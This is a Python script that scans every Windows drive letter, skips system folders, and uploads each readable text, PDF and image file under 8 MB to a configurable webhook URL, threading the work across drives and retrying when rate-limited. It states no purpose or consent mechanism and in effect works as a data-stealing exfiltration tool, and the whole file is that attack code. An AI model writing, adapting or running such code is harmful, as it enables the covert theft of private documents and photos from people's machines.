import os
import requests
import time
import threading

WEBHOOK_URL = ''  # Replace with your webhook URL
BLACKLISTED_DIRS = ['C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\']

def check_file(file_path):
    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.gif']
    max_size_mb = 8
    if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
        print(f"Skipping file {file_path} - invalid file type")
        return False
    elif os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
        print(f"Skipping file {file_path} - file size too large")
        return False
    elif os.path.isfile(file_path) and not os.access(file_path, os.R_OK):
        print(f"Skipping file {file_path} - file requires admin privileges")
        return False
    else:
        return True

def upload_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(WEBHOOK_URL, files=files)
            if response.status_code == 429:
                print(f"Rate limit exceeded - waiting for {response.json()['retry_after']} seconds")
                time.sleep(response.json()['retry_after']/1000)
                upload_file(file_path)  # Retry the upload after waiting
            elif response.status_code != 200:
                print(f"Failed to upload file {file_path} - error {response.status_code}")
            else:
                print(f"Successfully uploaded file {file_path}")
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")

def search_files(root_dir):
    for root, dirs, files in os.walk(root_dir):
        if any(blacklisted_dir in root for blacklisted_dir in BLACKLISTED_DIRS):
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if check_file(file_path):
                upload_file(file_path)

def thread_files(root_dirs):
    for root_dir in root_dirs:
        search_files(root_dir)

drives = ['%s:\\' % d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists('%s:' % d)]

# Split the drives into groups of 4
drive_groups = [drives[i:i+4] for i in range(0, len(drives), 4)]

# Search files in each group in parallel
for group in drive_groups:
    threads = []
    for drive in group:
        thread = threading.Thread(target=search_files, args=(drive,))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish before moving on to the next group
    for thread in threads:
        thread.join()
